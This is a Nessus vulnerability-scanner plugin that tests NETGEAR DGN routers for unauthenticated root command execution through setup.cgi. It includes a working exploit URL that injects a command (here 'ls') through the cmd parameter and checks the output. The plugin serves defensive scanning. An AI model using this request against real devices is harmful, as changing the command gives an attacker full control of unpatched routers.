#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(104128);
  script_version("1.3");
  script_cvs_date("Date: 2018/11/15 20:50:18");

  script_bugtraq_id(60281);

  script_name(english:"NETGEAR DGN Remote Unauthenticated Command Execution");
  script_summary(english:"Attempts to list the contents of the webroot.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote NETGEAR DGN device is affected by a flaw in the
setup.cgi script that allows an unauthenticated, remote attacker
to execute arbitrary commands with root privileges.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2013/Jun/8");
  # http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?197042fe");
  script_set_attribute(attribute:"solution", value:
"Upgrade the software on the device to NETGEAR DGN1000 1.1.00.48 / 
DGN2200 v3 or higher.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/05/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/10/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/h:netgear:dgn2200");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/h:netgear:dgn1000");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2018 Tenable Network Security, Inc.");

  script_dependencies("netgear_www_detect.nbin");
  script_require_keys("installed_sw/Netgear WWW");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("install_func.inc");
include("misc_func.inc");
include("http.inc");

get_install_count(app_name:"Netgear WWW", exit_if_zero:TRUE);
port = get_http_port(default:80, embedded:TRUE);
install = get_single_install(app_name:"Netgear WWW", port:port);

# Check if we got DGN model from WWW-Authenticate header
model = install['model'];
if(empty_or_null(model) || model !~ "DGN")
  audit(AUDIT_HOST_NOT, "an affected device");

exploit_req = "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=ls&curpath=/&currentsetting.htm=1";

res = http_send_recv3(port:port, method:"GET", item:exploit_req, exit_on_fail:TRUE);

# ls should give the following
# www.ita
# www.fre
# www.eng
# www.deu
# www
# wlan
# var
# usr
# tmp
# sys
# sbin
# proc
# modemhwe.bin
# lib
# k2img
# home
# etc
# dev
# bin

if("etc" >< res[2] && "bin" >< res[2] && "tmp" >< res[2])
{
  security_report_v4(
    port: port,
    severity: SECURITY_HOLE,
    cmd: "ls",
    request: make_list(build_url(qs:exploit_req, port:port)),
    output: res[2]);
}
else audit(AUDIT_LISTEN_NOT_VULN, "Netgear WWW", port);
